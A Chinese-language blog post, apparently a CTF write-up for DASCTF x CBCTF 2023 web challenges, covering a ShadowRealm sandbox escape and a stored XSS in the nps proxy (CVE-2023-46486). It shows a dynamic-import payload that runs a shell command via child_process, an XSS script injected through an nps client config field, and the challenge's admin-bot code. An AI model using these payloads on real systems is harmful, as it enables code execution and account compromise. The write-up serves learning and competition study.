<!DOCTYPE html><html lang="en"><head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <meta name="theme-color" content="#3367D6">
  <link rel="apple-touch-icon" href="/icons-192.png">
  <link rel="manifest" href="/manifest.json">
  
  <meta name="generator" content="Hexo 6.0.0">

  

  

  
    <meta name="author" content="1llustrious">
  

  

  

  <title>DAS0RAYSXCBCTF | å…‰è¾‰çš„blogå•¦~~</title>

  

  
    <link rel="shortcut icon" href="/favicon.ico">
  

  <!--mathjax latexæ•°å­¦å…¬å¼æ˜¾ç¤ºæ”¯æŒ-->
  
  

  
    
    
  

  

  


<script>function loadCss(l){var d=document,h=d.head,s=d.createElement('link');s.rel='stylesheet';s.href=l;!function e(f){if (d.body)return f();setTimeout(function(){e(f)})}(function(){h.appendChild(s);});}loadCss('/style.css');loadCss('https://cdn.jsdelivr.net/npm/typeface-source-code-pro@1.1.13/index.min.css');loadCss('https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.7.0/build/styles/monokai.min.css');</script><noscript><link rel="stylesheet" href="/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@1.1.13/index.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.7.0/build/styles/monokai.min.css"></noscript></head>
<body>
  <div class="root-container">
    
<!-- header container -->
<header class="header-container post">
  
    <div class="post-image" style="background-image: url(https://raw.githubusercontent.com/1llustrious/img/main/background6.jpg)"></div>
  

  <!-- navbar -->
<nav class="navbar">
  <div class="navbar-content">
    <!-- logo -->
    <div class="navbar-logo">
      <a href="/">
        
          å…‰è¾‰çš„blogå•¦~~
        
      </a>
    </div>
    <!-- link -->
    <div class="navbar-link">
      <div class="navbar-btn">
        <div></div>
        <div></div>
        <div></div>
      </div>
      <ul class="navbar-list">
        
          <li class="navbar-list-item"><a href="/">é¦–é¡µ</a></li>
        
          <li class="navbar-list-item"><a href="/links">å‹é“¾</a></li>
        
          <li class="navbar-list-item"><a href="/about">å…³äº</a></li>
        
      </ul>
    </div>
  </div>
</nav>

  
  

  
  

  
  

  
  

  
  
    <div class="header-content">
      <div class="post-text layout-block">
        <div class="layout-margin">
          <h1 class="title-wrap">DAS0RAYSXCBCTF</h1>
          <h2 class="title-sub-wrap">
            <strong>1llustrious</strong>
            <span>å‘å¸ƒäº</span>
            <time class="article-date" datetime="2023-11-30T08:12:36.000Z" itemprop="datePublished">2023-11-30</time>
          </h2>
          
          
          <ul class="wrap-list dark">
  
</ul>
          <ul class="wrap-list dark">
  
    <li><a href="/tags/CTF/">ğŸ·ï¸ CTF</a></li>
  
</ul>
        </div>
      </div>
    </div>
  

  
  
  
</header>

    <!-- æ–‡ç«  -->

<!-- æ–‡ç« å†…å®¹ -->
<div class="body-container">
  <article class="content-container layout-block post-container">
    <div class="article-info">
      
      
      
      
      <section class="article-entry markdown-body layout-margin content-padding--large soft-size--large soft-style--box">
        <!-- toc -->
<ul>
<li><a href="#das0raysxcbctf">DAS0RAYSxCBCTF</a></li>
<li><a href="#%E5%86%99%E5%9C%A8%E5%89%8D%E9%9D%A2">å†™åœ¨å‰é¢</a></li>
<li><a href="#yet-another-box">yet another box</a>
<ul>
<li><a href="#stack-trace-api">Stack trace API</a></li>
<li><a href="#shadow-realm-api">Shadow-Realm-API</a></li>
<li><a href="#dynamic-import%E6%96%B9%E6%A1%88">dynamic import æ–¹æ¡ˆ</a></li>
<li><a href="#exp">exp</a></li>
</ul>
</li>
<li><a href="#nps">nps</a>
<ul>
<li><a href="#%E5%BC%80%E6%89%93">å¼€æ‰“ğŸ˜“</a></li>
<li><a href="#remote%E5%B9%B2">remote å¹²ğŸ¤ª</a>
<ul>
<li><a href="#%E5%BF%86%E6%82%9F%E8%BF%99%E5%B0%B1%E6%98%AFxss%E7%9A%84%E6%9C%BA%E5%99%A8%E4%BA%BA%E5%88%9B%E9%80%A0">å¿†ï¼æ‚Ÿï¼è¿™å°±æ˜¯ xss çš„æœºå™¨äººåˆ›é€ </a></li>
<li><a href="#exp-1">exp</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#deserializeupload">Deserialize?Upload!</a>
<ul>
<li><a href="#actuator">actuatorğŸ˜«</a></li>
<li><a href="#%E9%A2%98%E7%9B%AE%E5%AE%9E%E8%B7%B5">é¢˜ç›®å®è·µğŸ˜“ğŸ˜¡</a></li>
<li><a href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90">ååºåˆ—åŒ–åˆ†æğŸ˜›</a></li>
<li><a href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%84%E5%90%88%E6%8B%B3">æ–‡ä»¶ä¸Šä¼  + ååºåˆ—åŒ–ç»„åˆæ‹³ğŸ˜¤</a></li>
</ul>
</li>
<li><a href="#dasctfxcbctf_2023_bypassjava">DASCTFXCBCTF_2023_bypassJava</a>
<ul>
<li><a href="#content-length%E9%99%90%E5%88%B6">Content-Length é™åˆ¶</a></li>
<li><a href="#chuncked%E7%BC%96%E7%A0%81%E6%80%8E%E4%B9%88%E5%8F%91">chuncked ç¼–ç æ€ä¹ˆå‘</a></li>
<li><a href="#%E4%B8%8D%E7%A8%B3%E5%AE%9Ajackson%E9%93%BE%E9%97%AE%E9%A2%98">ä¸ç¨³å®š jackson é“¾é—®é¢˜</a>
<ul>
<li><a href="#%E6%B5%81%E7%A8%8B">æµç¨‹</a></li>
<li><a href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E9%A1%BA%E5%BA%8F%E4%B8%8D%E4%B8%80%E5%AE%9A">ä¸ºä»€ä¹ˆé¡ºåºä¸ä¸€å®š</a></li>
<li><a href="#%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95">è§£å†³æ–¹æ³•ğŸ˜Š</a>
<ul>
<li><a href="#%E5%AE%9E%E7%8E%B0">å®ç°</a></li>
</ul>
</li>
<li><a href="#%E6%9E%84%E9%80%A0">æ„é€ </a></li>
</ul>
</li>
<li><a href="#%E5%86%85%E5%AD%98%E7%9A%84%E4%BD%BF%E7%94%A8">å†…å­˜ğŸçš„ä½¿ç”¨ğŸ¥µğŸ‘´</a>
<ul>
<li><a href="#%E5%88%97%E7%9B%AE%E5%BD%95">åˆ—ç›®å½•</a></li>
<li><a href="#%E8%AF%BB%E6%96%87%E4%BB%B6">è¯»æ–‡ä»¶</a></li>
</ul>
</li>
<li><a href="#rasp">RASPğŸ˜…ğŸ˜¡</a>
<ul>
<li><a href="#%E5%95%A5%E4%BA%8Brasp">å•¥äº‹ RASP</a></li>
</ul>
</li>
<li><a href="#%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88">è§£å†³æ–¹æ¡ˆğŸ˜’</a>
<ul>
<li><a href="#jni%E8%A7%84%E8%8C%83">JNI è§„èŒƒ</a></li>
</ul>
</li>
</ul>
</li>
</ul>
<!-- tocstop -->
<h1 id="das0raysxcbctf"><a class="markdownIt-Anchor" href="#das0raysxcbctf">#</a> DAS0RAYSxCBCTF</h1>
<h1 id="å†™åœ¨å‰é¢"><a class="markdownIt-Anchor" href="#å†™åœ¨å‰é¢">#</a> å†™åœ¨å‰é¢</h1>
<p>wcsnmd, è°ç»™ğŸ‘´å‡ºçš„è¿™ä¹ˆæ¶å¿ƒçš„ web,nmd çˆ†é›¶äº†ï¼Œtmd æ€»å…± 3100 çš„è§£ï¼Œä»€ä¹ˆâˆšâ‘§ç©æ„å„¿.</p>
<p>wp:<a target="_blank" rel="noopener" href="https://test-cuycc6s9lprw.feishu.cn/docx/T7budbiSWoTNd4xQGVicHL1Vnpf">â€Œâ€ï»¿â¡ï»¿â£â€Œâ€ï»¿â€â£â¢â¢ï»¿â€Œâ€â€¬ï»¿â£ï»¿â€Œâ£â¢â€Œâ¡â¤â¢â¤â¤â€Œâ€Œâ¡â¢â€Œâ€ï»¿â£â€Œâ€Œâ¡â£ï»¿ï»¿DASCTF x CBCTF - é£ä¹¦äº‘æ–‡æ¡£ (feishu.cn)</a></p>
<p><a target="_blank" rel="noopener" href="https://pankas.top/2023/10/22/dasctfxcbctf-2023-bypassjava-wp/">DASCTFXCBCTF_2023_bypassJava_Wp (pankas.top)</a></p>
<h1 id="yet-another-box"><a class="markdownIt-Anchor" href="#yet-another-box">#</a> yet another box</h1>
<p>è¿™é¢˜æ˜¯ä¸€ä¸ªæ¯”è¾ƒæ–°çš„æ²™ç®± <code>shadowrealm</code> , è¿™ byd å’Œ node çš„ vm8 å¤ªä¸€æ ·ï¼Œæœ‰ç€è‡ªå·±çš„å…¨å±€å¯¹è±¡å’Œå†…ç½®å‡½æ•°ï¼Œå°±æŒºæŠ½è±¡ï¼Œæ²¡æ³•åƒ <code>vm</code> , ä¹Ÿæ— æ³•é€šè¿‡ <code>prototype pollution</code>  æ§åˆ¶ä¸»æ¨¡å—ä¸­çš„å†…ç½®å±æ€§å¦å¤–ç”±äºä¸ package.json å£°æ˜äº† â€œtypeâ€:â€œmoduleâ€ ä¸”æ–‡ä»¶ç»“å°¾ä¸º .mjsï¼Œæ‰€é‡‡ç”¨çš„ ESM é»˜è®¤ strict modeï¼Œæ— æ³•é€šè¿‡ [stack-trace-api](<a target="_blank" rel="noopener" href="https://v8.dev/docs/stack-trace-api#customizing-stack-traces">Stack trace APIãƒ»V8 â€” å †æ ˆè·Ÿè¸ª APIãƒ»V8 å‘åŠ¨æœº</a>) è·¨ä¸Šä¸‹æ–‡å–å¾—å¯åˆ©ç”¨å¯¹è±¡ã€‚</p>
<h2 id="stack-trace-api"><a class="markdownIt-Anchor" href="#stack-trace-api">#</a> Stack trace API</h2>
<p>ä»…ä½œä¸ºå­¦ä¹ è®°å½•ä½¿ç”¨ï¼Œå¹¶ä¸ä¸ºæœ¬é¢˜æä¾›æ€è·¯.</p>
<p>é»˜è®¤æƒ…å†µä¸‹ï¼ŒV8 æŠ›å‡ºçš„å‡ ä¹æ‰€æœ‰é”™è¯¯éƒ½æœ‰ä¸€ä¸ªå±æ€§ï¼ŒæŠ›å‡ºé”™è¯¯çš„æ—¶å€™ä¼šç”¨åˆ°æ–¹æ³•ï¼Œè¯¥æ–¹æ³•èƒ½è·å¾—åˆ°å¤–é¢çš„å…¨å±€å¯¹è±¡.</p>
<h2 id="shadow-realm-api"><a class="markdownIt-Anchor" href="#shadow-realm-api">#</a> Shadow-Realm-API</h2>
<p><code>Wrapped Function Exotic Objects</code>  æ˜¯ä¸€ç§å¥‡å¼‚å¯¹è±¡ï¼Œå†…å«ä¸€ä¸ªå›è°ƒå‡½æ•°ã€‚å…·æœ‰ä¸€äº›å†…ç½®æ§½ <code>slot</code> ,:</p>
<table>
<thead>
<tr>
<th style="text-align:center">Internal slots</th>
<th style="text-align:center">Type</th>
<th style="text-align:center"><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">[[WrappedTargetFunction]]</td>
<td style="text-align:center">Callable Object</td>
<td style="text-align:center">Stores the callable object.</td>
</tr>
<tr>
<td style="text-align:center">[[Call]]</td>
<td style="text-align:center">The [[Call]] internal method</td>
<td style="text-align:center">Executes code associated with this objectâ€™s [[WrappedTargetFunction]].</td>
</tr>
<tr>
<td style="text-align:center">[[Realm]]</td>
<td style="text-align:center"><a target="_blank" rel="noopener" href="https://tc39.es/ecma262/#realm-record"> Realm Record</a></td>
<td style="text-align:center">The <a target="_blank" rel="noopener" href="https://tc39.es/ecma262/#realm">realm</a> in which the function was created.</td>
</tr>
</tbody>
</table>
<p>è¿˜æœ‰ [[Prototype]] and [[Extensible]]</p>
<p>å¯¹è±¡çš„ [[call]] æ–¹æ³•è·å–ä¸¤ä¸ªå‚æ•°:thisArgument, argumentsList . è°ƒç”¨æ—¶ä¼šå®ç°ä»¥ä¸‹æ­¥éª¤:</p>
<p>1. è®¾ç½®è¿è¡Œä»£ç çš„ä¸Šä¸‹æ–‡ã€‚æ‰§è¡Œä¸Šä¸‹æ–‡é€šå¸¸åŒ…æ‹¬æ‰§è¡Œå‡½æ•°çš„ä½œç”¨åŸŸã€å˜é‡ã€this å€¼ç­‰ä¿¡æ¯ã€‚</p>
<p>2. è®¾ç½®æ–°çš„ä½œç”¨åŸŸ calleecontext.</p>
<p>3. æ‰§è¡Œ assert æ–­è¨€ï¼Œç¡®ä¿ calleecontext æ˜¯ç›®å‰æ­£åœ¨æ‰§è¡Œçš„ä¸Šä¸‹æ–‡.</p>
<p>4. ç”¨ result å‚¨å­˜ **OrdinaryWrappedFunctionCall (F, thisArgument, argumentsList)** çš„è¿è¡Œç»“æœ</p>
<p>5.calleeContext è¢«ä»æ‰§è¡Œä¸Šä¸‹æ–‡æ ˆä¸­ç§»é™¤ï¼Œè€Œ callerContext è¢«æ¢å¤ä¸ºå½“å‰è¿è¡Œçš„æ‰§è¡Œä¸Šä¸‹æ–‡ã€‚</p>
<p>6. åˆ¤æ–­è¿”å›ç±»å‹ï¼Œå¦‚æœ [[TYPE]] å·²è¿”å›ï¼Œåˆ™è¿”å› value.</p>
<p>7. å¤„ç†å¼‚å¸¸</p>
<p>8. æ‰§è¡Œç»“æŸ.</p>
<h2 id="dynamic-import-æ–¹æ¡ˆ"><a class="markdownIt-Anchor" href="#dynamic-importæ–¹æ¡ˆ">#</a> dynamic import æ–¹æ¡ˆ</h2>
<p>é€šè¿‡åŠ¨æ€ import å…è®¸æˆ‘ä»¬æŒ‰éœ€åŠ è½½ JavaScript æ¨¡å—ï¼Œè€Œä¸ä¼šåœ¨æœ€å¼€å§‹çš„æ—¶å€™å°±å°†å…¨éƒ¨æ¨¡å—åŠ è½½ã€‚</p>
<p>åŠ¨æ€ import è¿”å›äº†ä¸€ä¸ª Promise å¯¹è±¡ï¼Œè¿™ä¹Ÿæ„å‘³ç€å¯ä»¥åœ¨ then ä¸­ç­‰æ¨¡å—åŠ è½½æˆåŠŸåå»åšä¸€äº›æ“ä½œã€‚</p>
<p>æ‰€ä»¥ import å¯¼å…¥éœ€è¦é€šè¿‡ then å»è§¦å‘å…¶æ–¹æ³•.</p>
<p>import åœ¨æ‰§è¡Œæ–¹æ³•åä»ç„¶æ˜¯ promise å¯¹è±¡ï¼Œé‡‡ç”¨çš„ç±»ä¼¼äºé“¾å¼è°ƒç”¨.</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var test = <span class="keyword">import</span>(<span class="string">"child_process"</span>).then(m=&gt;console.log(m))</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<p>å…¶ä¸­ test è·å– promise å¼‚æ­¥å¯¹è±¡ï¼Œè€Œ m ç›´æ¥å°±è·å¾— child_process å¯¹è±¡.</p>
<h2 id="exp"><a class="markdownIt-Anchor" href="#exp">#</a> exp</h2>
<p>ç®€è€Œè¨€ä¹‹</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ShadowRealm.prototype.evaluate =&gt; PerformShadowRealmEval =&gt; Execution Contexts</span><br></pre></td></tr></tbody></table></figure>
<p>æ”¯æŒ dynamic import</p>
<p>â€œDynamic importâ€ æ˜¯æŒ‡åœ¨ JavaScript ä¸­åŠ¨æ€åŠ è½½æ¨¡å—æˆ–æ–‡ä»¶çš„èƒ½åŠ›ã€‚è¿™æ˜¯ ECMAScript 2020 æ ‡å‡†çš„ä¸€éƒ¨åˆ†ï¼Œå¼•å…¥äº† import () å‡½æ•°ï¼Œå®ƒå¯ä»¥åœ¨è¿è¡Œæ—¶å¼‚æ­¥åŠ è½½æ¨¡å—ã€‚è¿™ä¸ä¼ ç»Ÿçš„é™æ€ import è¯­å¥ä¸åŒï¼Œåè€…åœ¨ä»£ç åŠ è½½æ—¶å³ç¡®å®šäº†è¦å¯¼å…¥çš„æ¨¡å—ã€‚</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span>(<span class="string">'child_process'</span>).then(m=&gt;m.execSync(<span class="string">'/readflag &gt; /app/asserts/flag'</span>));</span><br><span class="line"><span class="number">1</span>;</span><br></pre></td></tr></tbody></table></figure>
<h1 id="nps"><a class="markdownIt-Anchor" href="#nps">#</a> nps</h1>
<p>md åˆæ˜¯ xss,ğŸ‘´åˆ tnnd ä¸ä¼šï¼Œã—ã­ï¼</p>
<p>ğŸ§€ä¸€ä¸ª nps ç½‘ç«™ä¸Šçš„ xss. æ¶‰åŠ<a target="_blank" rel="noopener" href="https://blog.carrot2.cn/2023/10/nps2.html"> CVE-2023-46486</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/ehang-io/nps/releases/tag/v0.26.10">é¡¹ç›®åœ°å€</a></p>
<p>å½±å“èŒƒå›´:</p>
<p>nps&lt;=V0.26.10</p>
<p>ä½  tm æè¿™æ”¾å±å‘¢ï¼Œæœ€æ–°ç‰ˆæœ¬å°±æ˜¯è¿™ä¸ªï¼Œ21 å¹´æœ€å publish äº†.</p>
<p>æ¼æ´æ€ä¹ˆä¸ªäº‹:</p>
<p><code>bootstrapTable</code>  å¹¶æœªé…ç½® <code>escape</code>  å­—æ®µï¼Œä¸”ä½¿ç”¨æ—¶ä¸æ”¹é»˜è®¤é…ç½®</p>
<p><img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231101223246.png" alt="å¾®ä¿¡æˆªå›¾_20231101223246"></p>
<p>kokodayo,web/views/client/list.html</p>
<p><img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231101223529.png" alt="å¾®ä¿¡æˆªå›¾_20231101223529"></p>
<p>è¿™é‡Œè®¾ç½®å…¬é’¥ï¼Œé˜²æ­¢è¢« ntr (è¢«åˆ«äººç”¨ä»£ç†), ä½ ä¹Ÿä¸å¸Œæœ›ä½ æ‹¿ä¸åˆ° shell å§ (bushi)</p>
<p>åŒä¸ºä»£ç†ï¼Œç»å¸¸è¢«æèµ·çš„ frp å’Œ venom éƒ½æ²¡å¤ªæ³¨æ„å…¬é’¥ï¼Œå®é™…ä¸Šæ˜¯æœ‰å…¬é’¥è¿™ä¸€é€‰é¡¹çš„.</p>
<p>è¿™é‡Œï¼Œæˆ‘ä»¬å®Œå…¨å°±èƒ½å¤Ÿé€šè¿‡å®¢æˆ·ç«¯å»è¿›è¡Œæ”»å‡»äº†.</p>
<h2 id="å¼€æ‰“"><a class="markdownIt-Anchor" href="#å¼€æ‰“">#</a> å¼€æ‰“ğŸ˜“</h2>
<p>cnm,sbwindows, æ­»æ´»ç”¨ä¸æˆï¼Œlinux ä¸€ä¸‹å°±å‡ºæ¥äº†å’ŒğŸ‘´ğŸ˜¡äº†</p>
<p>âˆšâ‘§ç©æ„ï¼Œå½“ğŸ‘´â­ğŸ˜¡å§</p>
<p>é¦–å…ˆä¸‹è½½å®¢æˆ·ç«¯ï¼Œè¿™ä¸€ç‚¹å’Œ frp çš„ admin ç«¯å’Œ agent ç«¯ç±»ä¼¼</p>
<p>ç„¶åé…ç½®å®¢æˆ·ç«¯çš„é…ç½®æ–‡ä»¶</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr=<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8024</span></span><br><span class="line">conn_type=tcp</span><br><span class="line">vkey=<span class="number">123</span></span><br><span class="line">remark=&lt;sCRiPt&gt;alert(`nps hacker`)&lt;/sCrIpT&gt;</span><br></pre></td></tr></tbody></table></figure>
<p><img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231101224733.png" alt="å¾®ä¿¡æˆªå›¾_20231101224733"></p>
<p>Ã— æˆåŠŸäº†ï¼Œç‹ ç‹ åœ° Ã— è¿›å»</p>
<h2 id="remote-å¹²"><a class="markdownIt-Anchor" href="#remoteå¹²">#</a> remote å¹²ğŸ¤ª</h2>
<h3 id="å¿†æ‚Ÿè¿™å°±æ˜¯-xss-çš„æœºå™¨äººåˆ›é€ "><a class="markdownIt-Anchor" href="#å¿†æ‚Ÿè¿™å°±æ˜¯xssçš„æœºå™¨äººåˆ›é€ ">#</a> å¿†ï¼æ‚Ÿï¼è¿™å°±æ˜¯ xss çš„æœºå™¨äººåˆ›é€ </h3>
<p>é¦–å…ˆé¢˜ç›®é€šè¿‡ js ä»£ç é€ äº†ä¸ªåå°æœºå™¨äººï¼ŒğŸ‘´å¾ˆå–œæ¬¢</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> {chromium, errors} <span class="keyword">from</span> <span class="string">"playwright-chromium"</span>;</span><br><span class="line"></span><br><span class="line">const PASSWORD = <span class="string">"DASCTF_flag"</span>;</span><br><span class="line">(<span class="keyword">async</span> () =&gt; {</span><br><span class="line">    <span class="keyword">async</span> function visit() {</span><br><span class="line">        const page = <span class="keyword">await</span> context.newPage();</span><br><span class="line">        <span class="keyword">try</span> {</span><br><span class="line">            <span class="keyword">for</span> (let i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++){</span><br><span class="line">                <span class="keyword">try</span>{</span><br><span class="line">                    <span class="keyword">await</span> page.goto(<span class="string">'http://a.o.com:8080/client/list'</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                }catch (e) {</span><br><span class="line">                    console.log(e);</span><br><span class="line">                }</span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">await</span> page.waitForTimeout(<span class="number">1000</span>);</span><br><span class="line">            const element = <span class="keyword">await</span> page.isVisible(<span class="string">'button[langtag="word-login"]'</span>);</span><br><span class="line">            <span class="keyword">if</span> (element) {</span><br><span class="line">                <span class="keyword">await</span> page.fill(<span class="string">'input[name="username"]'</span>, <span class="string">'admin'</span>);</span><br><span class="line">                <span class="keyword">await</span> page.fill(<span class="string">'input[name="password"]'</span>, PASSWORD);</span><br><span class="line">                <span class="keyword">await</span> page.click(<span class="string">'button[langtag="word-login"]'</span>);</span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">await</span> page.waitForTimeout(<span class="number">1000</span>);</span><br><span class="line">            <span class="keyword">await</span> page.close();</span><br><span class="line">        } catch (e) {</span><br><span class="line">            <span class="keyword">if</span> (e instanceof errors.TimeoutError){</span><br><span class="line">                console.log(e);</span><br><span class="line">                <span class="keyword">await</span> page.close();</span><br><span class="line">            }<span class="keyword">else</span>{</span><br><span class="line">                console.log(e);</span><br><span class="line">            }     </span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    const browser = <span class="keyword">await</span> chromium.launch({</span><br><span class="line">        headless: true</span><br><span class="line">    });</span><br><span class="line">    const context = <span class="keyword">await</span> browser.newContext();</span><br><span class="line">    context.setDefaultTimeout(<span class="number">10000</span>);</span><br><span class="line"></span><br><span class="line">    setInterval(visit, <span class="number">30000</span>);</span><br><span class="line">})();</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<p>çœ‹ä¸æ‡‚æ²¡å…³ç³»ï¼ŒğŸ‘´æ¥å¸¦ä½ åˆ†æä¸€ä¸‹.</p>
<p>é¦–å…ˆæ•´ä¸ªå°±æ˜¯ä¸€å¨ shitâ›°,</p>
<p>é€šè¿‡ä¸€ä¸ªç®­å¤´å‡½æ•° () çš„æ–¹å¼ç«‹å³è°ƒç”¨</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">const browser = <span class="keyword">await</span> chromium.launch({</span><br><span class="line">        headless: true</span><br><span class="line">    });</span><br><span class="line">    const context = <span class="keyword">await</span> browser.newContext();</span><br><span class="line">    context.setDefaultTimeout(<span class="number">10000</span>);</span><br><span class="line">    setInterval(visit, <span class="number">30000</span>);</span><br></pre></td></tr></tbody></table></figure>
<p>é¦–å…ˆåˆ›å»ºä¸€ä¸ªæµè§ˆå™¨å’Œä¸Šä¸‹æ–‡ï¼Œç„¶åè®¾ç½® setIneterval, è¡¨ç¤ºæ¯ä¸‰åç§’è°ƒç”¨ visit, å‡½æ•°ï¼Œè®©ğŸ‘´çœ‹çœ‹ visit å‡½æ•°æ€ä¹ˆä¸ªäº‹</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> () =&gt; {</span><br><span class="line">    <span class="keyword">async</span> function visit() {</span><br><span class="line">        const page = <span class="keyword">await</span> context.newPage();</span><br><span class="line">        <span class="keyword">try</span> {</span><br><span class="line">            <span class="keyword">for</span> (let i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++){</span><br><span class="line">                <span class="keyword">try</span>{</span><br><span class="line">                    <span class="keyword">await</span> page.goto(<span class="string">'http://a.o.com:8080/client/list'</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                }catch (e) {</span><br><span class="line">                    console.log(e);</span><br><span class="line">                }</span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">await</span> page.waitForTimeout(<span class="number">1000</span>);</span><br><span class="line">            const element = <span class="keyword">await</span> page.isVisible(<span class="string">'button[langtag="word-login"]'</span>);</span><br><span class="line">            <span class="keyword">if</span> (element) {</span><br><span class="line">                <span class="keyword">await</span> page.fill(<span class="string">'input[name="username"]'</span>, <span class="string">'admin'</span>);</span><br><span class="line">                <span class="keyword">await</span> page.fill(<span class="string">'input[name="password"]'</span>, PASSWORD);</span><br><span class="line">                <span class="keyword">await</span> page.click(<span class="string">'button[langtag="word-login"]'</span>);</span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">await</span> page.waitForTimeout(<span class="number">1000</span>);</span><br><span class="line">            <span class="keyword">await</span> page.close();</span><br><span class="line">        } catch (e) {</span><br><span class="line">            <span class="keyword">if</span> (e instanceof errors.TimeoutError){</span><br><span class="line">                console.log(e);</span><br><span class="line">                <span class="keyword">await</span> page.close();</span><br><span class="line">            }<span class="keyword">else</span>{</span><br><span class="line">                console.log(e);</span><br><span class="line">            }     </span><br><span class="line">        }</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure>
<p>é¦–å…ˆè·å–æ–°é¡µé¢ï¼Œç„¶åè®¿é—®ä¸‰æ¬¡ <code>http://a.o.com:8080/client/list</code></p>
<p>ä½ çœ‹çœ‹çœ¼ç†Ÿä¸ï¼Œ/client/list åˆšå¥½å°±æ˜¯åˆšæ‰å±•ç¤º xss çš„è·¯å¾„ï¼Œä½ å“ï¼Œä½ ç»†å“ã€‚è¿™ä¸ª host çœ¼ç†Ÿä¸ï¼Œè¿™å¯æ˜¯åœ¨ docker é‡Œé¢è®¾ç½®çš„åœ°å€æ˜ å°„å•Š.</p>
<p>ãªã‚‰ã°ã€€ç­”ãˆã¯ã²ã¨ã¤ã </p>
<p>å°±æ˜¯ xss, æ¥ä¸‹æ¥å°±æ˜¯åˆ†æè¿™ä¸ªæœºå™¨äººäº‹æ€ä¹ˆæ“ä½œçš„äº†.</p>
<p>é¦–å…ˆè¦çœ‹æœ‰æ—  <code>button[langtag="word-login"]</code>  è¿™ç©æ„</p>
<p>é‚£æˆ‘ä»¬å°±éœ€è¦è®¾ç½®ä¸€ä¸ª button äº†ï¼Œä¸è¿‡æˆ‘ä»¬å¯ä»¥åœ¨è¿™é‡Œé¢ä¸‹ç‚¹æ¯’</p>
